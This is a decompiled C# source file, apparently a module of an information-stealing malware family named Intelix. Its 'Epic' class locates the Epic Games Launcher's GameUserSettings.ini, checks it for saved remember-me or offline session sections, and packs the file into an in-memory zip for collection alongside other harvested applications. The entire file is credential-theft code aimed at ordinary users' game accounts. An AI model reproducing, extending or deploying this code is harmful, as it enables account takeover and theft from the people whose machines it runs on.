using System;
using System.IO;
using System.Text;
using Intelix.Helper.Data;

namespace Intelix.Targets.Games
{
	// Token: 0x02000025 RID: 37
	public class Epic : ITarget
	{
		// Token: 0x0600006D RID: 109 RVA: 0x00005090 File Offset: 0x00003290
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
				"EpicGamesLauncher",
				"Saved",
				"Config",
				"Windows",
				"GameUserSettings.ini"
			});
			bool flag = File.Exists(text);
			if (flag)
			{
				string text2 = File.ReadAllText(text);
				bool flag2 = text2.Contains("[RememberMe]") || text2.Contains("[Offline]");
				if (flag2)
				{
					Counter.CounterApplications counterApplications = new Counter.CounterApplications();
					counterApplications.Name = "Epic Games";
					string text3 = "Epic\\GameUserSettings.ini";
					zip.AddFile(text3, Encoding.UTF8.GetBytes(text2));
					counterApplications.Files.Add(text + " => " + text3);
					counter.Games.Add(counterApplications);
				}
			}
		}
	}
}
